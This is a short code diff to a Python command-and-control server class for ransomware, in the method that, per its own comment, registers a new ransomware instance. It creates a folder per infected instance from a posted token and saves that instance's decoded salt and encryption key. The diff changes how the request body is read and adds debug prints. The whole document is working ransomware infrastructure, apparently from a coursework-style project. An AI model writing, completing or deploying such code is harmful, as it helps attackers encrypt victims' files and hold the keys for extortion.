@@ -20,15 +20,19 @@ class CNC(CNCBase):
 
     def post_new(self, path:str, params:dict, body:dict)->dict:
         # used to register new ransomware instance
-        newPath = ROOT_PATH + str(body[0])
+        print()
+        print(body)
+        print()
+        
+        newPath = ROOT_PATH + "/" + str(body['token'])
         os.mkdir(newPath)
 
         with open(newPath+'/salt.bin', 'wb') as secrets:
-            data = base64.b64decode(body[1])
+            data = base64.b64decode(body['salt'])
             secrets.write(data)
         
         with open(newPath+'/key.bin', 'wb') as secrets:
-            data = base64.b64decode(body[2])
+            data = base64.b64decode(body['key'])
             secrets.write(data)
 
         return {"status":"KO"}
